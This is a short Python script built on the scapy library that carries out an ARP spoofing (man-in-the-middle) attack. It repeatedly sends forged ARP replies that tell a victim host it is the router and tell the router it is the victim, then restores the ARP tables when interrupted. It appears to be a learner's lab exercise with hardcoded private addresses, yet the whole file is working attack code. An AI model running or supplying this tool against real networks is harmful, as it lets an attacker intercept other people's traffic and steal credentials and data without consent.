#!usr/bin/env python
import scapy.all as scapy
import time
import sys
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # answered, unanswered = scapy.srp(arp_request_broadcast, timeout=1)
    # print(answered.summary())
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    else:
        print("no response recieved")
        sys.exit(1)
    # gives the mac adress of the router
    # return clients_list

def spoof(target_ip, spoof_ip):
    # sending a packet to a victim that i have the routers mac address
    # pdst = ip of victim
    # hwdst = mac of victim
    # psrc = ip of router
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # packet = scapy.ARP(op=2, pdst="192.168.235.154", hwdst="00-0C-29-BB-7F-94", psrc="192.168.235.2")
    scapy.send(packet, verbose=False)
    # print(packet.show())
    # print(packet.summary())

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


sent_packet_count=0
try:
    while True:
        spoof("192.168.235.154", "192.168.235.2")
        #target_ip,gateway_ip
        #telling the victim iam the router
        spoof("192.168.235.2", "192.168.235.154")
        #gateway_ip,target_ip
        #telling the router iam the target machin
        sent_packet_count = sent_packet_count+2
        print("\r[+] print sent : " + str(sent_packet_count), end="")
        sys.stdout.flush()
        time.sleep(2)


except KeyboardInterrupt:
    restore("192.168.235.154", "192.168.235.2")
    restore("192.168.235.2", "192.168.235.154")
    print("[+]restoring arp values. program is terminated by user")

# command line to execute == python3 (filename)
